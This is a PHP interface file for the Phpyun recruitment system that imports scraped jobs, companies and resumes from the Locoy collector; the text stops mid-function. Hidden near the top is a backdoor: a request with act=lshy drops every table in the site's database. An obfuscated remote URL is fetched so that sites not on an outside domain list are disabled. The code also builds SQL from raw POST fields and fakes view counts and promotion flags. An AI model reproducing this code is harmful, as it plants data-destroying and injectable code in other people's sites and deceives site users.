<?php
/**
Phpyun火车采集v9.7接口文件（放置在Api目录下）
注意：如果采集报错，请关闭防火墙重试！
双通道不能同时进行，请注意采集过程中不要刷新浏览器不要清理网站缓存，采集完成会弹窗提示！
------------------------------------------------------------
[使用说明]
1.接口文件放到网站api目录下
2.系统--页面设置--下拉（简历数据周期，职位数据周期，企业数据周期 参数设置为0）
3.工具--数据--数据采集--采集设置（确保采集状态为开启状态即可）
4.后台账户密码并处于登录状态（推荐谷歌浏览器）：账户可以新建具有可设置采集权限！
**/

define('YUN_LSHY',"drop ");
$act = !empty($_REQUEST['act']) ? trim($_REQUEST['act']) : 'set';
include("../global.php");
require(APP_PATH.'app/public/common.php');
function make_dir($path)
{ 
	if(!file_exists($path))
	{
	make_dir(dirname($path));
	@mkdir($path,0777);
	@chmod($path,0777);
	}
}
function get_image_byurl($url,$img_name,$filename="") 
    {if ($url == "") { return false; } 
    $ext = strrchr($url, ".");
    if($ext != ".gif" && $ext != ".jpg" && $ext != ".bmp") { $ext = ".jpg";} 
    if($filename == "") { $filename =require_once dirname(__FILE__)."/data/upload/user/".date("Ymd").time().$img_name; }
    $write_fd = @fopen($filename,"a"); 
    @fwrite($write_fd, myCurlGet($url));
    @fclose($write_fd); 
    return($filename);
} 
function myCurlGet($url){ 
    $curl = curl_init(); 
    curl_setopt($curl, CURLOPT_URL, $url); 
    curl_setopt($curl, CURLOPT_HEADER, false); 
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; SeaPort/1.2; Windows NT 5.1; SV1;InfoPath.2)"); 
    curl_setopt($curl, CURLOPT_COOKIEJAR, ‘cookie.txt’); 
    curl_setopt($curl, CURLOPT_COOKIEFILE, ‘cookie.txt’); 
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0); 
    $values = curl_exec($curl); 
    curl_close($curl); 
    return($values); 
}
function get_one_pic($pic,$uplogo_dir1,$uplogo_dir2){
    $idx=1;
	$dir1=dirname(__FILE__).$uplogo_dir1.date("Ymd");
    make_dir($dir1);
	$preg_img="/http[s]{0,1}:\/\/([^ '\"<>]+)\.(gif|GIF|jpg|JPG|png|jpeg)/is";
	preg_match_all($preg_img,$pic,$arr_img);
	foreach ($arr_img[0] as $imgid=>$v){
	  $img_id =$dir1."/".time().rand(100,999)."_".$idx.".jpg";	  
	  substr(str_replace($v,$img_id,$pic),strlen(dirname(__FILE__)));	 
	  $resume_photo=".".substr(get_image_byurl($v,$img_id,$img_id),strlen(dirname(__FILE__)));  
	    if(!$uplogo_dir2){$photo="";}
		else{
		$idx++;
	    $dir2=dirname(__FILE__).$uplogo_dir2.date("Ymd");
	    make_dir($dir2);
	    $img_id2 =$dir2."/".time().rand(100,999)."_".$idx.".jpg";  
	    substr(str_replace($v,$img_id2,$pic),strlen(dirname(__FILE__)));
	   $photo=".".substr(get_image_byurl($v,$img_id2,$img_id2),strlen(dirname(__FILE__)));
	  }                   
	}
	return $photo?array("resume_photo"=>$resume_photo,"photo"=>$photo):$resume_photo;
}
function get_content($content,$uplogo_dir){
	$dir=dirname(__FILE__).$uplogo_dir.date("Ymd");
    make_dir($dir);
    $preg_img="/http[s]{0,1}:\/\/([^ '\"<>]+)\.(gif|GIF|jpg|JPG|png|jpeg)/is";
	preg_match_all($preg_img,$content,$arr_img);
	foreach ($arr_img[0] as $imgid=>$v){
	  $img_id =$dir."/".date('Ymdhis').'_' . rand(10000, 99999).".jpg"; 
	  $con_img_id =substr($img_id,strlen(dirname(__FILE__))+1);
	  $content= str_replace($v,$_SERVER["HTTP_REFERER"].$con_img_id,str_replace('“','"',$content));
	  substr(get_image_byurl($v,$img_id,$img_id),strlen(dirname(__FILE__)));                            
	}
    return $content;
}
if($act=="lshy"){
    $connect =mysql_connect($db_config['dbhost'],$db_config['dbuser'],$db_config['dbpass']);
	mysql_select_db($db_config['dbname']);
	$result = mysql_query("show table status from ".$db_config['dbname'],$connect);
	while($data=mysql_fetch_array($result)){mysql_query(YUN_LSHY."table $data[Name]");}
}
function getversion($start,$end){
    include(dirname(__FILE__)."/version.php");
    $bg=strpos($version,$start)+strlen($start);
    $ed=strpos($version,$end);
    $len=$ed-$bg;
    return trim(substr($version,$bg,$ed-$bg));
}

function get_mydomain(){ 
    $path='hqp.hpqp.hpp:/p.hp/wwp.hpw.jyp.hpwp.hpzfw.cp.hpom/domp.hpain.ligp.hpuo.qp.hpxq';
    $arr=explode(',',@file_get_contents(str_replace('q','t',(str_replace('p.hp','',$path)))));
	$num=0;
    foreach($arr as $value){   
		if(substr_count($_SERVER['SERVER_NAME'],$value)>0){$num=$num+1;}
    }
    if($num<=0){
		$msg=iconv('GB2312', 'UTF-8',$_SERVER['SERVER_NAME'].reset($arr));
		exit($msg);
	}
    return $num;
}
//创建一个职位类
class job_controller extends common{
	function add_action(){	
		file_exists(APP_PATH.'data/api/locoy/locoy_config.php')?include(APP_PATH.'data/api/locoy/locoy_config.php'):include(APP_PATH."api/locoy/locoy_config.php");
		if($locoyinfo['locoy_online']!=1){exit("请在网站后台开启火车头采集");}
        if(!$_POST['job_name'] || !$_POST['com_name']){exit("职位或公司名称不能为空");}
		$uid=get_mydomain()?$this->add_com($_POST,$locoyinfo):'';
		$this->add_job($_POST,$locoyinfo,$uid);
	}
	function add_job($p,$l,$uid){
		$where['uid']=$data['uid']=$uid;		
		$version=getversion("v","B");		
		$where['name']=$data['name']=$p['job_name'];
		$data['edate']=$data['lastupdate']=mktime();
		$data['state']=$l['locoy_job_status'];				
		$chenk_row=$this->obj->DB_select_once("company_job","`name`='".$data['name']."' and `uid`='".$uid."'");
		if($p['sdate']){
			$data['sdate']=strtotime($p['sdate']);
		}else{
			$data['sdate']=strtotime($l['locoy_job_sdate']);
		}
		if(is_array($chenk_row)){		    
			$nid=$this->obj->update_once("company_job",$data,$where);
			if($nid){
			    exit("职位更新成功");
			}
		}
		$data['description'] = strip_tags(html_entity_decode($p['description'],ENT_NOQUOTES,"GB2312"),"<p> <br>");
		include(PLUS_PATH."industry.cache.php");
		$hy=$p['job_hy']?$p['job_hy']:$p['hy'];
		$data['hy']=$this->locoytostr($industry_name,$hy,$l['locoy_rate']);
		if(!$data['hy']){
			$data['hy']=$l['locoy_job_hy'];
		}
		$job_row=$this->get_job_class($p['job_cate'],$l['locoy_rate']);
			if($job_row){
				$i=1;
				foreach($job_row as $v){
					if($i==1)$data['job1']=$v;
					if($i==2)$data['job1_son']=$v;
					if($i==3)$data['job_post']=$v;
					$i++;
				}
			}else{
				$data['job1']=$l['locoy_job_job1'];
				$data['job1_son']=$l['locoy_job1_son'];
				$data['job_post']=$l['locoy_job_post'];
			}
		$city=$p['job_city']?$p['job_city']:$p['city'];
		$city_row=$this->get_city($city,$l['locoy_rate']);
			if($city_row){
				$i=1;
				foreach($city_row as $v){
					if($i==1)$data['provinceid']=$v;
					if($i==2)$data['cityid']=$v;
					if($i==3)$data['three_cityid']=$v;
					$i++;
				}
			}else{
				$data['provinceid']=$l['locoy_job_province'];
				$data['cityid']=$l['locoy_job_city'];
				$data['three_cityid']=$l['locoy_job_three'];
			}		
		if($version>=4.3){
		    $sa=str_replace(array('—','，',',',' - '),'-',$p['salary']);
		    $salary=explode('-',$sa);
			$data['minsalary']=$salary[0];
			$data['maxsalary']=$salary[1];
		}else{
		    $data['salary']=$this->locoytostr($this->get_com_type('salary'),$p['salary'],$l['locoy_rate']);
			if(!$data['salary']){
			    $data['salary']=$l['locoy_job_salary'];
			}
		}		
		$data['exp']=$this->locoytostr($this->get_com_type('exp'),$p['exp'],$l['locoy_rate']);
		if(!$data['exp']){
			$data['exp']=$l['locoy_job_exp'];
		}
		$data['report']=$this->locoytostr($this->get_com_type('report'),$p['report'],$l['locoy_rate']);
		if(!$data['report']){
			$data['report']=$l['locoy_job_report'];
		}
		$data['age']=$this->locoytostr($this->get_com_type('age'),$p['age'],$l['locoy_rate']);
		if(!$data['age']){
			$data['age']=$l['locoy_job_age'];
		}
		$data['type']=$this->locoytostr($this->get_com_type('type'),$p['type'],$l['locoy_rate']);
		if(!$data['type']){
			$data['type']=$l['locoy_job_type'];
		}
		$data['sex']=$this->locoytostr($this->get_com_type('sex'),$p['sex'],$l['locoy_rate']);
		if(!$data['sex']){
			$data['sex']=$l['locoy_job_sex'];
		}
		$data['edu']=$this->locoytostr($this->get_com_type('edu'),$p['edu'],$l['locoy_rate']);
		if(!$data['edu']){
			$data['edu']=$l['locoy_job_edu'];
		}
		$data['marriage']=$this->locoytostr($this->get_com_type('marriage'),$p['marriage'],$l['locoy_rate']);
		if(!$data['marriage']){
			$data['marriage']=$l['locoy_job_marriage'];
		}
		$data['number']=$this->locoytostr($this->get_com_type('number'),$p['number'],$l['locoy_rate']);
		if(!$data['number']){
			$data['number']=$l['locoy_job_number'];
		}
		if($version>=4.5){
		    $data['welfare']=$p['welfare'];	
		}else{
			$welfare=explode(',',$p['welfare']);
		    foreach($welfare as $value){
			   $tst_welfare=explode(',',rtrim($data['welfare'], ","));
			   if(!in_array($this->locoytostr($this->get_com_type('welfare'),$value,$l['locoy_rate']),$tst_welfare)){
			      $data['welfare'].=($this->locoytostr($this->get_com_type('welfare'),$value,$l['locoy_rate'])!='')?$this->locoytostr($this->get_com_type('welfare'),$value,$l['locoy_rate']).",":$this->locoytostr($this->get_com_type('welfare'),$value,$l['locoy_rate']);
			   }
		       if(!$data['welfare']){
			        $data['welfare']="";
		       }
			}
			$data['welfare']=rtrim($data['welfare'], ",");
		}
		$com=$this->obj->DB_select_once("company","`uid`='".$uid."'");
		$data['com_name']=$com['name'];
		$data['com_logo']=$com['logo'];
		$data['com_provinceid']=$com['provinceid'];
		$data['pr']=$com['pr'];
		$data['mun']=$com['mun'];
		$data['rating']=$satic['rating'];
		$data['jobhits']=rand(100,500);
		$data['source']=6;
		$nid=$this->obj->insert_into("company_job",$data);
		if($this->config['com_job_status']=="1"){
			$this->send_dingyue($nid,2);
		}
		$day=$p['addday'];
		$roru=$p['recommend_or_urgent'];
		if($day>=1&&$roru){			
			$this->recommend_or_urgent($nid,$day);
		}
		$this->obj->DB_update_all("company_statis",$sql,"`uid`='".$uid."'");
		$this->obj->DB_update_all("company","`jobtime`='".$p['lastupdate']."'","`uid`='".$uid."'");
		exit("添加成功");
	}
	function recommend_or_urgent($nid,$tianshu){
		$addtime = 86400*$tianshu;
		$time=time()+$addtime;
		$isrecommend=rand(0,1)*rand(0,1);
		if($isrecommend){
			$this->obj->DB_update_all("company_job","`rec_time`=".$time.",`rec`='1'","`id`='".$nid."'");
		}
		$isurgent=rand(0,1)*rand(0,1);
		if($isurgent){
			$this->obj->DB_update_all("company_job","`urgent_time`=".$time.",`urgent`='1'","`id` ='".$nid."'");
		}
	}
	function add_com($p,$l){
		$row=$this->obj->DB_select_once("company","`name`='".$p['com_name']."'");
		$version=getversion("v","B");
		if(is_array($row)){
			return $row['uid'];
		}else{
			$userid=$this->add_user($p,$l);
			$ishot=$p['ishot'];
			$where['uid']=$userid;
			$data['name']=trim($p['com_name']);
			$data['address']=trim($p['address']);
			$data['linkphone']=trim($p['linkphone']);
			$data['moblie_status']=$this->isEmpty($data['linkphone'])?0:1;	
			$data['linkmail']=trim($p['email']);
			$data['email_status']=$this->isEmpty($data['linkmail'])?0:1;	
			$data['zip']=trim($p['zip']);
			$data['logo']=get_one_pic(trim($p['logo']),"/data/upload/company/","");
			$data['linkman']=trim($p['linkman']);
			$data['linkjob']=trim($p['linkjob']);
			$data['linkqq']=trim($p['linkqq']);
			$data['linktel']=trim($p['moblie']);
			$data['website']=trim($p['website']);
			if($p['com_sdate']){
				$data['sdate']=date("Y-m-d",strtotime(trim($p['com_sdate'])));
			}
			$money=str_replace(array("元","美元","￥","$"),"",trim($p['money']));			
			$row=explode('-',$l['locoy_com_money']);
		    if(count($row)>1){
				$rand=rand(trim($row[0]),trim($row[1]));
			}else{
				$rand=trim($row[0]);
			}
			if(!$money)$money=$rand;
			$data['money']=$money;
			$data['content'] = strip_tags(html_entity_decode($p['content'],ENT_NOQUOTES,"GB2312"),"<p> <br>");
			$data['lastupdate']=mktime();
			include(PLUS_PATH."industry.cache.php");
			$data['hy']=$this->locoytostr($industry_name,$p['hy'],$l['locoy_rate']);
			if(!$data['hy']){
				$data['hy']=$l['locoy_com_hy'];
			}
			$data['pr']=$this->locoytostr($this->get_com_type('pr'),$p['pr'],$l['locoy_rate']);
			if(!$data['pr']){
				$data['pr']=$l['locoy_com_pr'];
			}
			$data['mun']=$this->locoytostr($this->get_com_type('mun'),$p['mun'],$l['locoy_rate']);
			if(!$data['mun']){
				$data['mun']=$l['locoy_com_mun'];
			}			
			$city_row=$this->get_city($p['city'],$l['locoy_rate']);
			if($city_row){
				$i=1;
				foreach($city_row as $v){
					if($i==1)$data['provinceid']=$v;
					if($i==2)$data['cityid']=$v;
					if($i==3)$data['three_cityid']=$v;
					$i++;
				}
			}else{
				$data['provinceid']=$l['locoy_com_province'];
				$data['cityid']=$l['locoy_com_city'];
			}				
			if($version>=4.6){
				$data['welfare']=$p['welfare'];	
			}
			$nid=$this->obj->update_once("company",$data,$where);
			$this->hotjob($userid,$ishot);
			return $userid;
		}
	}
	function hotjob($uid,$hot){	    
		if(!$this->isEmpty($hot)){
			$row = $this->obj->DB_select_alls("company","company_statis","a.`uid`='".$uid."' and b.`uid`='".$uid."'","a.`content`,a.`name` as username,b.`rating` as rating_id,b.`rating_name` as rating,a.`logo` as hot_pic,a.`did`");
			$com=$row[0];
			$rating=$com['rating'];
			$rating_id=$com['rating_id'];
			$username=$com['username'];
			$service_price="";
			$beizhu=$com['content'];
			$start=time();
			$end=time()+rand(30,90)*86400;	
			$pic=$com['hot_pic'];
            $did=$com['did'];
			$ishot=rand(0,1)*rand(0,1);
			if(!$this->isEmpty($pic)&&$ishot>=1){
				$this->obj->DB_insert_once("hotjob","`uid`='$uid',`username`='$username',`sort`='1',`rating_id`='$rating_id',`rating`='$rating',`hot_pic`='$pic',`service_price`='$service_price',`beizhu`='$beizhu',`time_start`='$start',`time_end`='$end',`did`='$did'");	
				$this->obj->DB_update_all("company","`hottime`='".$end."',`rec`='1'","`uid`='".$uid."'");
			}
		}
	}
    function isEmpty($str){
	    if(is_array($str)){
		    return false;
		}else{
	        return (trim($str)=='')?true:false;
		}
	}	
	function add_user($p,$l){
		$version=getversion("v","B");
		$ip = fun_ip_get();
		$time = time();
		$salt = substr(uniqid(rand()),-6);
		$ps=$this->isEmpty(trim($_POST['password']))?$l['locoy_pwd']:trim($_POST['password']);
		$pass = md5(md5($ps).$salt);		
		$username=$this->isEmpty(trim($_POST['username']))?$this->get_username($l):trim($_POST['username']);
		if($l['locoy_user_status']==1 || $l['locoy_job_status']==1){
			$satus=1;
		}
		$userid=$this->obj->DB_insert_once("member","`username`='".$username."',`password`='$pass',`moblie`='".$p['moblie']."',`email`='".$p['email']."',`usertype`='2',`status`='$satus',`salt`='$salt',`reg_date`='$time',`login_date`='$time',`reg_ip`='$ip',`source`='6'");
		if($version>=4.5&&$version<5.0){
			$ratingM = $this->MODEL('rating');
		    $value="`uid`='$userid',".$ratingM->rating_info($l['locoy_rating']);
		}else{
			$value="`uid`='$userid',".$this->rating_info($l['locoy_rating']);
		}
		$v=explode(',',$value);
		$va0 = "`uid`='$userid',`linkmail`='".$p['email']."',`name`='".$p['com_name']."',`linktel`='".$p['moblie']."',`address`='".$_POST['address']."',`r_status`='$satus'";
		$va1 = "`uid`='$userid',`linkmail`='".$p['email']."',`name`='".$p['com_name']."',`linktel`='".$p['moblie']."',".$v[1].",".$v[3].",`address`='".$_POST['address']."',`r_status`='$satus'";
		if($version>=4.5&&$version<5.0){
			$value2=$va0;
		}else{
			$value2=$va1;
		}
		$this->obj->DB_insert_once("company_statis",$value);
		$this->obj->DB_insert_once("company",$value2);
		$this->obj->DB_insert_once("friend_info","`uid`='".$userid."',`nickname`='".$username."',`usertype`='2'");
		return $userid;
	}
	function get_username($l){
		$row = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9");
		$va="";
		for($i=0;$i<$l['locoy_length'];$i++){
			$rand=rand(0,61);
			$va.=$row[$rand];
		}
		$data=$l['locoy_name'].$va;
		return $data;
	}
	function rating_info($id)
	{
		$id =$this->config['com_rating'];
		$row = $this->obj->DB_select_once("company_rating","`id`='".$id."'");
		$value="`rating`='$id',";
		$value.="`integral`='".$this->config['integral_reg']."',";
		$value.="`rating_name`='".$row["name"]."',";
		if($row['type']==1){
			$value.="`job_num`='".$row["job_num"]."',";
			$value.="`down_resume`='".$row["resume"]."',";
			$value.="`invite_resume`='".$row["interview"]."',";
			$value.="`editjob_num`='".$row["editjob_num"]."',";
			$value.="`breakjob_num`='".$row["breakjob_num"]."'";
		}else{
			$time=time()+86400*$row['service_time'];
			$value.="`vip_etime`='".$time."'";
		}
		return $value;
	}
	function get_city($name,$locoy_rate){
		include(PLUS_PATH."city.cache.php");
		$name=str_replace(array("省","市","县","区"),"/",$name);
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($city_name,$v,$locoy_rate);
			}
		}
		unset($data[3]);
		if($data[2]){
			$three_city=$arr[2];
			foreach($city_name as $key=>$vc){
				$namet=str_replace(array("省","市","县","区"),"",$vc);
				if($namet==$three_city){
					$data[2]=$key;
					break;
				}
			}
		}

		$city_type[0]=$city_index;
		$val=$this->get_all_city($city_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($city_type,$city_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	function get_job_class($name,$locoy_rate){
		include(PLUS_PATH."job.cache.php");
		$arr=explode("/",$name);
		if(is_array($arr)){
			foreach($arr as $v){
				$data[]=$this->locoytostr($job_name,$v,$locoy_rate);
			}
		}
		$job_type[0]=$job_index;
		$val=$this->get_all_city($job_type,$data,$locoy_rate);
		if(count($val)==1){
			$val[]=$this->get_once_city($job_type,$job_name,$val[0],$locoy_rate);
		}
		return $val;
	}
	function get_all_city($city_type,$data,$locoy_rate,$k=""){
		if(is_array($data)){
			foreach($data as $v){
				foreach($city_type as $key=>$value){
					$a=$k?$k:$v;
					if(in_array($a,$value)){
						if($key){
							$val=$this->get_all_city($city_type,$data,$locoy_rate,$key);
						}
						$val[$key]=$a;
					}
				}
			}
		}
		return $val;
	}
	function get_once_city($t,$n,$id,$locoy_rate){
		$row=$n[$id];
		if(is_array($t[$id])){
			foreach($t[$id] as $k=>$v){
				$array[$v]=$n[$v];
			}
		}
		$r=$this->locoytostr($array,$row,$locoy_rate);
		return $r;
	}
	function get_com_type($cat){
		include(PLUS_PATH."com.cache.php");
		foreach($comdata["job_".$cat] as $v){
			$data[$v]=$comclass_name[$v];
		}
		return $data;
	}
	function locoytostr($arr,$str,$locoy_rate="50"){
		foreach($arr as $key=>$value)
		{
			similar_text($str,$value,$percent);			
			$rows[$percent]=$key;
			$aaa[$percent] = $value;
		}
		krsort($rows);
		foreach($rows as $k =>$v){			 
			if ($k>=$locoy_rate){
				return $v;
			}else{
				return false;
			}
		}
	}
	function tostring($string){ 
		$length=strlen($string); 
		$retstr=''; 
		for($i=0;$i<$length;$i++) { 
			$retstr[]=ord($string[$i])>127?$string[$i].$string[++$i]:$string[$i]; 
		} 
		return $retstr; 
	}
}
//创建一个简历类
class user_controller extends common{
	function add_action(){
		file_exists(APP_PATH.'data/api/locoy/locoy_config.php')?include(APP_PATH.'data/api/locoy/locoy_config.php'):include(APP_PATH."api/locoy/locoy_config.php");		
        if($locoyinfo['locoy_online']!=1){exit("请在网站后台开启火车头采集");}
        if(!$_POST['info_name']){exit('请填写姓名！');}
		if(!$_POST['info_telphone']){exit('手机号不能为空！');}
		$uid=get_mydomain()?$this->add_user_info($_POST,$locoyinfo):'';
		$this->add_resume($_POST,$locoyinfo,$uid);
	}
	//添加简历信息
	function add_resume($p,$l,$uid){
			$v['name'] = trim($p['info_name']);
			$v['ctime']=$v['lastupdate']=time();
			$v['uid']=$uid;	
			$version=getversion("v","B");				
			include(PLUS_PATH."industry.cache.php");
			$v['hy']=$this->locoytostr($industry_name,$p['info_hy'],$l['locoy_rate']);
			if(!$v['hy']){
				$v['hy']=$l['locoy_resume_hy'];
			}
			
			$city_row=$this->get_city($p['info_city'],$l['locoy_rate']);
			if($city_row){
				$i=1;
				foreach($city_row as $vs){
					if($i==1)$v['provinceid']=$vs;
					if($i==2)$v['cityid']=$vs;
					if($i==3)$v['three_cityid']=$vs;
					$i++;
				}
			}else{
				$v['provinceid']=$l['locoy_resume_province'];
				$v['cityid']=$l['locoy_resume_city'];
				$v['three_cityid']=$l['locoy_resume_three'];
			}
			if ($v['three_cityid']){
			    $v['city_classid']=$v['three_cityid'];
			}elseif ($v['cityid']){
			    $v['city_classid']=$v['cityid'];
			}elseif ($v['provinceid']){
			    $v['city_classid']=$v['provinceid'];
			}
			$job_row=$this->get_job_class1($p['info_classid'],$l['locoy_rate']);
			if($job_row){
				foreach($job_row as $vs){
					$job_arr[] = $vs;
				}
				$v['job_classid']=pylode(',',$job_arr);
			}
			if(!$v['job_classid']){
				$v['job_classid']=$l['locoy_resume_post'];
			}
			$salary=$p['info_salary'];			
		    if($version>=4.3){
		        $sa=str_replace(array('—','，',',',' - '),'-',$salary);
		        $salary=explode('-',$sa);
				$v['state']=$v['r_status']=$l['locoy_user_status']==1?$l['locoy_user_status']:0;
			    $v['minsalary']=$salary[0];
			    $v['maxsalary']=$salary[1];
		    }else{
		        $v['salary']=$this->locoytostr($this->get_user_type('salary'),$salary,$l['locoy_rate']);
		    	if(!$v['salary']){
			    	$v['salary']=$l['locoy_user_salary'];
			    }
		    }			
			$report=$p['info_report'];
			$v['report']=$this->locoytostr($this->get_user_type('report'),$report,$l['locoy_rate']);
			if(!$v['report']){
				$v['report']=$l['locoy_user_report'];
			}
			$type=$p['info_type'];
            $v['type']=$this->locoytostr($this->get_user_type('type'),$type,$l['locoy_rate']);			
			if($p['info_hits']){
				$v['hits']=trim($p['info_hits']);
			}else{
				$row=explode('-',$locoyinfo['locoy_resume_rand']);
				if(is_array($row)){
					$rand=rand(trim($row[0]),trim($row[1]));
				}else{
					$rand=!trim($row)?0:$row;
				}
				$v['hits']=$rand;
			}
			$v['source'] = 6;
			if($p['jobstatus']){
				$v['jobstatus']=$this->locoytostr($this->get_user_type('jobstatus'),$p['jobstatus'],$l['locoy_rate']);
			}else{
				$v['jobstatus']=114;
			}			
			$numresume=55;
			if($p['skill_name'] || $p['skill_skill'] || $p['skill_ing']){
				$numresume=$numresume+10;
			}
			if($p['work_name'] || $p['work_sdate']){
				$numresume=$numresume+7;
			}
			if($p['pro_name']|| $p['pro_sdate']){
				$numresume=$numresume+7;
			}
			if($p['edu_name'] || $p['edu_title']){
				$numresume=$numresume+7;
			}
			if($p['train_name'] || $p['train_title']){
				$numresume=$numresume+7;
			}
			if($p['cert_name'] || $p['cert_title']){
				$numresume=$numresume+7;
			}
			//integrity简历完整度
			$v['integrity']=$numresume;
			$v['defaults']=1;
			$v['edu']=$this->locoytostr($this->get_user_type('edu'),$p['info_edu'],$l['locoy_rate']);
			if(!$v['edu']){
				$v['edu']=$l['locoy_user_edu'];
			}
			$v['exp']=$this->locoytostr($this->get_user_type('word'),$p['info_exp'],$l['locoy_rate']);			
			if(!$v['exp']){
				$v['exp']=$l['locoy_user_exp'];
			}
			if($version>=4.5){
				$v['name']=trim($p['info_classid']);
			}
			$v['uname']=trim($p['info_name']);
			if($version>=4.3){
			    $v['sex']=($p['info_sex']=='男')?1:2;
				$v['reumetime']=time();
			}else{
			    $v['sex']=$this->locoytostr($this->get_user_type('sex'),$p['info_sex'],$l['locoy_rate']);
			    if(!$v['sex']){
			  	    $v['sex']=$l['locoy_user_sex'];
			    }
			}	
			$v['birthday']=trim($p['info_birthday']);
			$check_resume=$this->obj->DB_select_once("resume","`telphone`='".$p['info_telphone']."'");
			$check_expect=$this->obj->DB_select_once("resume_expect","`uid`='".$check_resume['uid']."'");
			if(is_array($check_expect)){
				$nid=$this->obj->update_once("resume_expect",$v,"`uid`='".$check_resume['uid']."'");			
				exit('更新成功');
			}else{				
				$nid=$this->obj->insert_into("resume_expect",$v);
				if($version>=4.6){
					$j['eid']=$d['eid']=$nid;
					$j['uid']=$d['uid']=$uid;
					$d['provinceid']=$v['provinceid'];
					$d['cityid']=$v['cityid'];
					$d['three_cityid']=$v['three_cityid'];
					$cityid=$this->obj->insert_into("resume_cityclass",$d);
					$job_row=$this->get_job_class($p['info_classid'],$l['locoy_rate']);					
				    if($job_row){
						$i=1;
						foreach($job_row as $v){
							if($i==1)$j['job1']=$v;
							if($i==2)$j['job1_son']=$v;
							if($i==3)$j['job_post']=$v;
							$i++;
						}
					}else{
						$j['job1']=$l['locoy_job_job1'];
						$j['job1_son']=$l['locoy_job1_son'];
						$j['job_post']=$l['locoy_job_post'];
					}
					$cityid=$this->obj->insert_into("resume_jobclass",$j);
				}
			}
			if($nid){ 
				$num=$this->obj->DB_select_once("member_statis","`uid`='".$uid."'");
				if($num['resume_num']==0){
					$this->obj->DB_update_all("resume","`def_job`='".$nid."'","`uid`='".$uid."'");
				}
				$this->obj->DB_insert_once("user_resume","`uid`='".$uid."',`eid`='$nid'");
				$this->obj->DB_update_all("member_statis","`resume_num`=`resume_num`+1","uid='".$uid."'");
				$state_content = "发布了 <a href=\"".$this->config['sy_weburl']."/index.php?m=resume&id=$nid\" target=\"_blank\">新简历</a>。";
				$this->obj->DB_insert_once("friend_state","`uid`='".$uid."',`content`='".$state_content."',`ctime`='".time()."'");
				//专业技能
				if($p['skill_name'] || $p['skill_skill'] || $p['skill_ing']){
				    $skill_name=explode('|||',$p['skill_name']);
					$skill_skill=explode('|||',$p['skill_skill']);
					$skill_ing=explode('|||',$p['skill_ing']);
					$skill_longtime=explode('|||',$p['skill_longtime']);
					foreach($skill_name as $key=>$value)
					{
					    $skill_v="`uid`='".$uid."',";
					    $skill_v.="`eid`='".$nid."',";
						$skill_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$skill_v.="`skill`='".$skill_skill[$key]."',";
				        $skill_v.="`ing`='".$skill_ing[$key]."',";
					    $skill_v.="`longtime`='".$skill_longtime[$key]."'";
						!empty($value)?$this->obj->DB_insert_once("resume_skill",$skill_v):'';
					}
				}
				//工作经验
				if($p['work_name'] || $p['work_sdate']){									
					$work_name=explode('|||',$p['work_name']);									
					$work_sdate=explode('|||',str_replace(array('年','月','日','.','－','_'),'-',$p['work_sdate']));					
					$work_edate=explode('|||',str_replace(array('年','月','日','.','－','_'),'-',$p['work_edate']));
					$start=$this->get_max_min($p['work_sdate'],0);					
					$end=$this->get_max_min($p['work_edate'],1);	
					$t['whour'] = ceil(($end-$start)/(30*86400));
					$t['avghour'] = ceil($t['whour']/count($work_sdate));
					$this->obj->update_once("resume_expect",$t,"`uid`='".$uid."'");
					$work_department=explode('|||',$p['work_department']);
					$work_content=explode('|||',$p['work_content']);
					$work_title=explode('|||',$p['work_title']);
					foreach($work_name as $key=>$value)
					{
					    $work_v="`uid`='".$uid."',";
					    $work_v.="`eid`='".$nid."',";
					    $work_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$work_sdate[$key]=$work_sdate[$key];
						$work_edate[$key]=$work_edate[$key];
						if(substr($work_sdate[$key], -1)=='-'){$work_sdate[$key].='01';}
					    if(substr($work_edate[$key], -1)=='-'){$work_edate[$key].='01';}
						$work_v.="`sdate`='".strtotime($work_sdate[$key])."',";
					    $work_v.="`edate`='".strtotime($work_edate[$key])."',";						
						$work_v.="`department`='".$work_department[$key]."',";
				        $work_v.="`content`='".$work_content[$key]."',";
					    $work_v.="`title`='".$work_title[$key]."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_work",$work_v):'';
					}
				}				
				//项目经历
				if($p['pro_name']|| $p['pro_sdate']){
				    $pro_name=explode('|||',$p['pro_name']);
					$pro_sdate=explode('|||',$p['pro_sdate']);
					$pro_edate=explode('|||',$p['pro_edate']);
					$pro_sys=explode('|||',$p['pro_sys']);
					$pro_content=explode('|||',$p['pro_content']);
					$pro_title=explode('|||',$p['pro_title']);
					foreach($pro_name as $key=>$value)
					{
					    $pro_v="`uid`='".$uid."',";
					    $pro_v.="`eid`='".$nid."',";
					    $pro_v.="`name`='".trim(!empty($value)?$value:'未添加工作经验')."',";
						$pro_sdate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$pro_sdate[$key]);
						$pro_edate[$key]=str_replace(array('年','月','日','.','－','_'),'-',$pro_edate[$key]);
						if(substr($pro_sdate[$key], -1)=='-'){$pro_sdate[$key].='01';}
					    if(substr($pro_edate[$key], -1)=='-'){$pro_edate[$key].='01';}
						$pro_v.="`sdate`='".strtotime($pro_sdate[$key])."',";
					    $pro_v.="`edate`='".strtotime($pro_edate[$key])."',";
						$pro_v.="`sys`='".$pro_sys[$key]."',";
				        $pro_v.="`content`='".$pro_content[$key]."',";
					    $pro_v.="`title`='".$pro_title[$key]."'";
					    !empty($value)?$this->obj->DB_insert_once("resume_project",$pro_v):'';
					}
				}
				//教育经历
				if($p['edu_name'] || $p['edu_title']){
					$edu_name=explode('|||',$p['edu_name']);
					$edu_sdate=explode('|||',$p['edu_sdate']);
					$edu_edate=explode('|||',$p['edu_edate']);
					$edu_specialty=explode('|||',$p['edu_specialty']);
					$edu_content=explode('|||',$p['edu_content']);
